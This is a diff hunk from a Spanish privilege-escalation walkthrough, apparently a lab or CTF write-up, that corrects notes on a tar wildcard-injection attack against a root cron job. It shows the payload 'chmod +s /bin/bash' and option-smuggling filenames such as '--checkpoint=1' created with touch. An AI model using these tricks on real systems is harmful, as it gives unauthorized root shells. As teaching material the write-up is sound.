@@ -197,7 +197,7 @@ Cuando el cron ejecute `tar czf ... *`, el globo expande también los ficheros `
 > **⚠️ Errores que salieron por el camino:**
 >
 > 1. **Ruta relativa en el payload:** `chmod +s bin/bash` falla porque el cron hace `cd /opt/backups` antes y ahí no existe `bin/bash`. Solución: ruta absoluta → `chmod +s /bin/bash` (o `cp /bin/bash /tmp/bash && chmod +s /tmp/bash`).
-> 2. **`touch --"--checkpoint=1"` sin espacio:** sale `touch: unrecognized option '---checkpoint=1'`. El `--` debe ir **separado** de la opción: `touch -- '--checkpoint=1'`.
+> 2. **`touch --"--checkpoint=1"` sin espacio:** sale `touch: unrecognized option '---checkpoint=1'` (el `--` y la opción se fusionan en `---checkpoint=1`). El `--` debe ir **separado** de la opción: `touch -- "--checkpoint=1"`.
 
 ---
 
